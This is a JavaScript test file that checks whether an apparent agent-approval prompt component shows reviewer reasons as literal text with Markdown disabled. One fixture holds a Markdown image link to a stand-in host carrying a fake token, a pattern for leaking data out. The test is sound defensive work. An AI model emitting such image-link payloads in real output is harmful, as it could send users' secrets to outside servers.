import assert from 'node:assert/strict';
import test from 'node:test';
import { build } from 'esbuild';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { createInstance } from 'i18next';
import { I18nextProvider } from 'react-i18next';

await build({
  entryPoints: ['src/components/InteractionSlot/AuthorizationPrompt.tsx'],
  bundle: true,
  packages: 'external',
  platform: 'node',
  format: 'esm',
  outfile: 'node_modules/.cache/approval-reason-display/AuthorizationPrompt.mjs',
  define: { 'import.meta.env.DEV': 'false' },
  loader: { '.css': 'empty', '.svg': 'dataurl', '.png': 'dataurl' },
});
const { AuthorizationQuestionDetails } = await import('../node_modules/.cache/approval-reason-display/AuthorizationPrompt.mjs');
const i18n = createInstance();
await i18n.init({ lng: 'zh', resources: { zh: { translation: {} } }, interpolation: { escapeValue: false } });

function render(question) {
  return renderToStaticMarkup(createElement(I18nextProvider, { i18n },
    createElement(AuthorizationQuestionDetails, { questions: [question], requestId: 'request-1' })));
}

test('reviewer reasons remain complete literal text without active Markdown resources', () => {
  const reason = '/home/user/reports/报告.txt，后续说明。\n'
    + '![proof](https://example.invalid/p?token=FAKE_SECRET)\n'
    + '完整理由。'.repeat(400) + '末尾约束。';
  const html = render({
    question: reason,
    options: [],
    reviewer_metadata: {
      decision_source: 'auto_reviewer',
      final_reviewer_status: 'manual',
      manual_reason_summary: reason,
    },
  });
  assert.ok(html.includes(reason));
  assert.ok(html.includes('whitespace-pre-wrap'));
  assert.ok(!html.includes('<img'));
  assert.ok(!html.includes('<a '));
});

test('other permission bodies keep their existing Markdown presentation', () => {
  const html = render({ question: '**Confirm this action**', options: [] });
  assert.ok(html.includes('<strong>Confirm this action</strong>'));
});
